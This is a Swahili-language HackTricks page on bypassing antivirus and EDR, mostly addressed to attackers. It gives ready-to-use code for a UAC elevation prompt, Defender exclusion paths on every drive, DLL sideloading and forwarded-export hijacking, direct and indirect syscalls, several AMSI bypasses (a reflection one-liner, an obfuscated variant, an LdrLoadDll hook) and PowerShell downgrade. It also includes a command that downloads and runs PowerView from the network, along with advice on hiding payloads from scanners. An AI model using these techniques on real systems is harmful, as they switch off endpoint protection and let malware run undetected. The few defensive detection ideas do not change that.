# Kupita Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Simamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kusimamisha Windows Defender kufanya kazi kwa kujifanya AV nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Chambo cha UAC cha aina ya installer kabla ya kuchezea Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi husambazwa kama installers za Node.js/Nexe ambazo hazijasainiwa. Kwanza **humwomba mtumiaji ruhusa za juu**, kisha huzima Defender. Mchakato ni rahisi:

1. Kagua kama kuna muktadha wa kiutawala kwa kutumia `net session`. Amri hii hufaulu tu pale mpigaji ana haki za admin, kwa hivyo ikishindwa inaonyesha kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Iwasha upya mara moja kwa kutumia kitenzi cha `RunAs` ili kuanzisha kidokezo cha kawaida cha idhini ya UAC huku ikihifadhi mstari asilia wa amri.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kuwa wanasakinisha programu “cracked”, hivyo kwa kawaida hukubali ombi hilo, na hivyo kuipa malware ruhusa zinazohitajika kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Exclusions za `MpPreference` kwa kila herufi ya kiendeshi

Baada ya kupata ruhusa za juu, minyororo ya aina ya GachiLoader huongeza maeneo ambayo Defender haiwezi kukagua badala ya kuzima huduma moja kwa moja. Kwanza, loader husitisha watchdog ya GUI (`taskkill /F /IM SecHealthUI.exe`) kisha huweka **exclusions pana mno** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kuondolewa isiweze kuchanganuliwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Uchunguzi muhimu:

- Mzunguko hupitia kila filesystem iliyowekwa (D:\, E:\, vijiti vya USB, n.k.), kwa hiyo **payload yoyote itakayowekwa baadaye popote kwenye diski itapuuzwa**.
- Kutengwa kwa kiendelezi `.sys` kunalenga siku zijazo—washambuliaji wanahifadhi chaguo la kupakia drivers zisizosainiwa baadaye bila kugusa Defender tena.
- Mabadiliko yote huwekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua zinazofuata zinaweza kuthibitisha kuwa vizuizi vimeendelea kuwepo au kuvipanua bila kuchochea UAC tena.

Kwa kuwa hakuna huduma ya Defender inayozimwa, ukaguzi wa kawaida wa hali unaendelea kuripoti “antivirus active” ingawa ukaguzi wa wakati halisi hauchunguzi kamwe njia hizo.<sup>[[26]](#references)</sup>

## **Mbinu za Kukwepa AV**

Kwa sasa, AV hutumia mbinu tofauti kubaini kama faili ni hasidi au la: ugunduzi tuli, uchanganuzi wa dynamic, na kwa EDR za kisasa zaidi, uchanganuzi wa tabia.

### **Ugunduzi tuli**

Ugunduzi tuli hufanywa kwa kutambua strings hasidi zinazojulikana au mfululizo wa bytes katika binary au script, na pia kutoa taarifa kutoka kwenye faili yenyewe (k.m. maelezo ya faili, jina la kampuni, saini za kidijitali, ikoni, checksum, n.k.). Hii ina maana kwamba kutumia tools za umma zinazojulikana kunaweza kukufanya ugunduliwe kwa urahisi zaidi, kwa kuwa huenda zimechanganuliwa na kutambuliwa kuwa hasidi. Kuna njia kadhaa za kukwepa aina hii ya ugunduzi:

- **Usimbaji fiche**

Ukisimba binary, AV haitaweza kugundua program yako, lakini utahitaji aina fulani ya loader ili kusimba data hiyo na kuendesha program kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji tu ni kubadilisha baadhi ya strings kwenye binary au script yako ili ipite AV, lakini hii inaweza kuchukua muda kulingana na unachojaribu kuficha.

- **Zana maalum**

Ukitengeneza tools zako mwenyewe, hakutakuwa na signatures hasidi zinazojulikana, lakini hii huchukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kuangalia ugunduzi tuli wa Windows Defender ni kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawanya faili katika sehemu nyingi kisha huiagiza Defender kuchanganua kila sehemu kivyake; kwa njia hii, inaweza kukuonyesha hasa strings au bytes zilizotambuliwa kwenye binary yako.

Ninapendekeza sana uangalie [orodha hii ya video za YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu vitendo vya kukwepa AV.

### **Uchanganuzi wa Dynamic**

Uchanganuzi wa dynamic ni pale AV inapoendesha binary yako kwenye sandbox na kufuatilia shughuli hasidi (k.m. kujaribu kusimba kisha kusoma nywila za browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kufanyia kazi, lakini haya ni baadhi ya mambo unayoweza kufanya ili kukwepa sandbox:

- **Kulala kabla ya kuanza kutekeleza** Kulingana na jinsi ilivyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa uchanganuzi wa dynamic wa AV. AV zina muda mfupi sana wa kuchanganua faili ili zisiweze kukatiza mtiririko wa kazi wa mtumiaji, kwa hiyo kutumia muda mrefu wa kusubiri kunaweza kuvuruga uchanganuzi wa binaries. Tatizo ni kwamba sandbox nyingi za AV zinaweza kuruka muda huo wa kusubiri, kutegemea jinsi ulivyotekelezwa.
- **Kuangalia rasilimali za mashine** Kwa kawaida sandbox huwa na rasilimali chache sana za kutumia (k.m. < 2GB RAM), la sivyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kuangalia halijoto ya CPU au hata kasi ya feni; si kila kitu kitatekelezwa kwenye sandbox.
- **Ukaguzi mahususi wa mashine** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza kuangalia domain ya kompyuta ili kuona kama inalingana na uliyobainisha. Isipolingana, unaweza kufanya program yako itoke.

Inabainika kuwa jina la kompyuta la sandbox ya Microsoft Defender ni HAL9TH. Kwa hiyo, unaweza kukagua jina la kompyuta kwenye malware yako kabla haijaendeshwa; likiwa HAL9TH, inamaanisha uko ndani ya sandbox ya Defender, hivyo unaweza kufanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukwepa sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kituo cha #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **tools za umma** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza swali hili:

Kwa mfano, ikiwa unataka kutupa LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project tofauti isiyojulikana sana ambayo pia hutupa LSASS?

Jibu sahihi huenda likawa la pili. Tukichukua mimikatz kama mfano, huenda ni mojawapo ya malware zinazotambuliwa zaidi na AV na EDR, kama siyo inayotambuliwa zaidi. Ingawa project yenyewe ni nzuri sana, pia ni ngumu sana kuitumia kukwepa AV, kwa hiyo tafuta tu njia mbadala za kufanikisha unachojaribu kufanya.

> [!TIP]
> Unaporekebisha payloads zako ili kukwepa ugunduzi, hakikisha **umezima uwasilishaji wa sampuli kiotomatiki** kwenye Defender, na tafadhali, kwa kweli **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kukwepa ugunduzi kwa muda mrefu. Ikiwa unataka kuangalia kama AV fulani inagundua payload yako, isakinishe kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, kisha ifanyie majaribio hapo hadi uridhike na matokeo.

## EXEs dhidi ya DLLs

Inapowezekana, **kipaumbele kiwe kutumia DLLs ili kukwepa ugunduzi**. Kulingana na uzoefu wangu, faili za DLL kwa kawaida **hugunduliwa na kuchanganuliwa kwa kiwango cha chini zaidi**, kwa hiyo huu ni ujanja rahisi sana wa kuepuka ugunduzi katika baadhi ya hali (ikiwa payload yako ina njia ya kufanya kazi kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina kiwango cha ugunduzi cha 4/26 kwenye antiscan.me, ilhali EXE payload ina kiwango cha ugunduzi cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Ulinganisho wa antiscan.me kati ya Havoc EXE payload ya kawaida na Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha baadhi ya mbinu unazoweza kutumia na faili za DLL ili zisiweze kutambuliwa kwa urahisi zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka application lengwa na payload(s) hasidi pamoja.

Unaweza kutafuta program zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itatoa orodha ya programu zilizo hatarini kwa DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu zinazoweza kuathiriwa na DLL Hijack/Sideload**, mbinu hii huwa fiche sana ikitekelezwa ipasavyo, lakini ukitumia programu za DLL Sideload zinazojulikana hadharani, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa sababu programu inatarajia kuwe na functions fulani maalum ndani ya DLL hiyo. Ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza calls ambazo programu hufanya kutoka kwenye DLL ya proxy (na hasidi) kwenda kwenye DLL asili, hivyo kuhifadhi utendaji wa programu na kuwezesha kushughulikia utekelezaji wa payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) wa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo wa chanzo wa DLL, na DLL asili iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyosimbwa kwa [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zote zina kiwango cha ugunduzi cha 0/26 katika [antiscan.me](https://antiscan.me)! Ningesema hilo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kwa undani kuhusu tuliyojadili.

### Kutumia Vibaya Forwarded Exports (ForwardSideLoading)

Moduli za Windows PE zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, ingizo la export huwa na mfuatano wa ASCII wa umbo la `TargetDll.TargetFunc`. Caller anapotafuta export hiyo, Windows loader itafanya yafuatayo:

- Kupakia `TargetDll` ikiwa haijapakiwa tayari
- Kutafuta `TargetFunc` ndani yake

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye namespace ya KnownDLLs iliyolindwa (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, hutumika mpangilio wa kawaida wa kutafuta DLL, unaojumuisha saraka ya moduli inayofanya uelekezaji huo.

Hii huwezesha primitive ya sideloading isiyo ya moja kwa moja: tafuta DLL iliyosainiwa ambayo hu-forward function kwenye jina la moduli isiyo KnownDLL, kisha iweke pamoja na DLL inayodhibitiwa na mshambuliaji yenye jina linalolingana kabisa na moduli lengwa iliyoforwardiwa. Forwarded export inapoombwa, loader hutatua forward na kupakia DLL yako kutoka saraka hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hiyo hutatuliwa kwa kutumia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyosainiwa hadi kwenye folda inayoweza kuandikika
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. `DllMain` ndogo inatosha kutekeleza msimbo; huhitaji kutekeleza function iliyosambazwa ili kuanzisha `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyozingatiwa:
- rundll32 (iliyotiwa saini) hupakia `keyiso.dll` ya side-by-side (iliyotiwa saini)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuendeshwa

Vidokezo vya kutafuta:
- Lenga exports zinazoelekezwa mbele ambazo moduli lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha exports zinazoelekezwa mbele kwa kutumia zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya Windows 11 forwarder ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya kugundua/kulinda:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinazopakia DLLs zilizotiwa saini kutoka kwenye njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina lilelile la msingi kutoka kwenye saraka hiyo
- Toa arifa kuhusu minyororo ya process/module kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` ndani ya njia ambazo watumiaji wanaweza kuandika
- Tekeleza sera za uadilifu wa code (WDAC/AppLocker) na ukatae ruhusa za write+execute katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni zana ya payload ya kukwepa EDRs kwa kutumia processes zilizosimamishwa, direct syscalls, na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kutambuliwa kesho, kwa hivyo usitegemee zana moja pekee. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls na Utatuzi wa SSN (SysWhispers4)

EDR mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kupita hooks hizo, unaweza kutengeneza **direct** au **indirect** syscall stubs zinazopakia **SSN** (System Service Number) sahihi na kuingia kwenye kernel mode bila kutekeleza entrypoint ya export iliyowekewa hook.<sup>[[32]](#references)</sup>

**Chaguo za kuita:**
- **Direct (embedded)**: weka instruction ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna export ya `ntdll` inayoguswa).
- **Indirect**: ruka hadi kwenye gadget iliyopo ya `syscall` ndani ya `ntdll` ili mpito kwenda kernel uonekane kuwa umetoka `ntdll` (inafaa kwa evasion ya heuristic); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila call.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tafuta mfuatano wa syscall wakati wa runtime.

**Mikakati ya utatuzi wa SSN inayostahimili hooks:**
- **FreshyCalls (VA sort)**: kadiria SSN kwa kupanga syscall stubs kulingana na anwani zao pepe badala ya kusoma bytes za stub.
- **SyscallsFromDisk**: map faili safi ya `\KnownDlls\ntdll.dll`, soma SSN kutoka kwenye `.text` yake, kisha uondoe mapping (hupita hooks zote za ndani ya memory).
- **RecycledGate**: changanya makadirio ya SSN kwa kupanga VA na uthibitishaji wa opcode wakati stub iko safi; tumia makadirio ya VA ikiwa imewekewa hook.
- **HW Breakpoint**: weka DR0 kwenye instruction ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua bytes zilizowekewa hook.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Hapo awali, AVs ziliweza kuchanganua **faili zilizo kwenye diski** pekee. Kwa hiyo, ikiwa ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja kwenye memory**, AV isingeweza kuzuia hilo kwa kuwa haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa kwenye vipengele hivi vya Windows.

- User Account Control, au UAC (kupandisha ruhusa kwa EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi shirikishi, na tathmini ya dynamic code)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Kipengele hiki huruhusu suluhisho za antivirus kukagua tabia ya scripts kwa kuwasilisha maudhui ya scripts katika umbo lisilosimbwa na lisilofichwa.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutasababisha tahadhari ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyotanguliza `amsi:` kisha njia ya executable iliyotumiwa kuendesha script; katika hali hii, powershell.exe

Hatukuacha faili yoyote kwenye diski, lakini bado tulinaswa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, code ya C# pia hupitia AMSI. Hili huathiri hata `Assembly.Load(byte[])` inayotumika kupakia utekelezaji kwenye memory. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au ya chini) kunapendekezwa kwa utekelezaji kwenye memory ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hutegemea zaidi ugunduzi wa static, kubadilisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa ugunduzi.

Hata hivyo, AMSI inaweza kufichua scripts zilizofanyiwa obfuscation hata zikiwa na tabaka nyingi, kwa hiyo obfuscation inaweza kuwa chaguo baya kutegemea jinsi ilivyofanywa. Hii hufanya kuikwepa kusiwe rahisi moja kwa moja. Ingawa, wakati mwingine, unachohitaji tu ni kubadilisha majina kadhaa ya variables na utakuwa sawa; kwa hiyo inategemea ni kwa kiwango gani kitu kimewekewa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiwa mtumiaji asiye na privileged access. Kwa sababu ya dosari hii katika utekelezaji wa AMSI, watafiti wamepata njia nyingi za kukwepa uchanganuzi wa AMSI.

**Kulazimisha Hitilafu**

Kulazimisha uanzishaji wa AMSI ushindwe (amsiInitFailed) kutasababisha uchanganuzi usianzishwe kwa mchakato wa sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imetengeneza signature ya kuzuia matumizi yake kuenea zaidi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kilichohitajika tu ni mstari mmoja wa code ya powershell ili kuifanya AMSI isiweze kutumika katika mchakato wa sasa wa powershell. Bila shaka, mstari huu umetambuliwa na AMSI yenyewe, kwa hivyo unahitaji kurekebishwa kidogo ili kutumia technique hii.

Huu hapa ni AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Kumbuka kwamba huenda hili likawekewa alama mara tu chapisho hili litakapotolewa, kwa hivyo usichapishe code ikiwa mpango wako ni kutotambuliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua ingizo lililotolewa na mtumiaji) na kuibadilisha kwa maagizo ya kurejesha code ya E_INVALIDARG. Kwa njia hii, matokeo ya uchanganuzi halisi yatakuwa 0, ambayo huchukuliwa kuwa matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.

Pia kuna mbinu nyingine nyingi zinazotumiwa kupita AMSI kwa kutumia powershell. Angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa kwenye process ya sasa. Mbinu thabiti ya kupita AMSI isiyofungamana na lugha ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` ambayo hurejesha hitilafu ikiwa module inayoombwa ni `amsi.dll`. Matokeo yake, AMSI haipakii kamwe na hakuna uchanganuzi unaofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa utekelezaji (pseudocode ya x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Maelezo
- Hufanya kazi kwenye PowerShell, WScript/CScript na custom loaders (chochote ambacho kingepakia AMSI).
- Ichanganye na kutuma scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka alama ndefu za command-line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya bypass AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya bypass AMSI inayokwepa signature kwa kutumia function na variables zilizobainishwa na mtumiaji na zilizobadilishwa kwa nasibu, character expressions, na kubadilisha nasibu herufi kubwa na ndogo katika keywords za PowerShell ili kuepuka signature.

**Ondoa signature iliyotambuliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa signature ya AMSI iliyotambuliwa kwenye memory ya process ya sasa. Tool hii huchanganua memory ya process ya sasa kutafuta signature ya AMSI, kisha huibadilisha kwa maelekezo ya NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell version 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## Uwekaji Kumbukumbu wa PS

Uwekaji kumbukumbu wa PowerShell ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zilizotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kukwepa kugunduliwa**.

Ili kukwepa uwekaji kumbukumbu wa PowerShell, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Tumia PowerShell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia kipindi cha PowerShell kisichodhibitiwa**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuendesha PowerShell bila kuzindua `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa vidhibiti vinavyohusishwa mahususi na mchakato wa `powershell.exe`, lakini haizimi yenyewe AMSI, Script Block Logging, au kila ulinzi mwingine wa PowerShell; kiwango cha ulinzi hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo linaloongeza entropy ya binary na kurahisisha AVs na EDRs kuigundua. Kuwa mwangalifu na hili, na labda tumia usimbaji fiche kwenye sehemu mahususi tu za code yako ambazo ni nyeti au zinahitaji kufichwa.

